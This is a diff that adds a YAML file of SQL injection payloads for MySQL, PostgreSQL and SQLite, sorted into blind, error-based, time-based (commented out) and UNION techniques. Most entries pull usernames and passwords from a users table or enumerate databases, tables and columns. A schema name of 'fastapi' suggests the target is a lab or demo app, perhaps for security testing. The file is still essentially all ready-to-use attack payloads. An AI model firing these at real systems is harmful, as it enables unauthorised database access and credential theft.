@@ -1,0 +1,37 @@
+mysql:
+  blind:
+  - "1' OR '1"
+  error:
+  - "1' AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- - "
+  # condition:
+  # - "1' AND IF (length(database())=7, SLEEP (3), 1) -- " # correct sleep3
+  # - "1' AND IF (SUBSTRING(database(),1,1)='a', SLEEP (3), 1) -- " ## Not correct no sleep
+  union:
+    # Get user table
+  - "1' UNION SELECT username, password FROM users -- "
+  # Get All dabatases
+  - "' UNION SELECT NULL, DATABASE() -- "
+  # Get all tables in database
+  - "' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema = 'fastapi'  -- "
+  # Get information of user Table
+  - "' UNION SELECT NULL, CONCAT(column_name, ':', data_type) FROM information_schema.columns WHERE table_name = 'users' -- "
+
+pgsql:
+  blind:
+  - "1' OR '1"
+  union:
+  # Get user table
+  - "1' UNION SELECT id, username || ' : ' || password FROM users order by id --"
+  # Get database tables
+  - "' UNION SELECT NULL, datname FROM pg_database --"
+  # Get information of user Table
+  - "' UNION SELECT NULL, column_name || ' : ' ||  data_type FROM information_schema.columns WHERE table_name='users' --"
+
+sqlite:
+  blind:
+  - "1' OR '1"
+  union:
+  # Get user table
+  - "1' UNION SELECT username, password FROM users -- "
+  # Get database tables schema
+  - "1' UNION SELECT 1, sql FROM sqlite_master WHERE type='table' --"
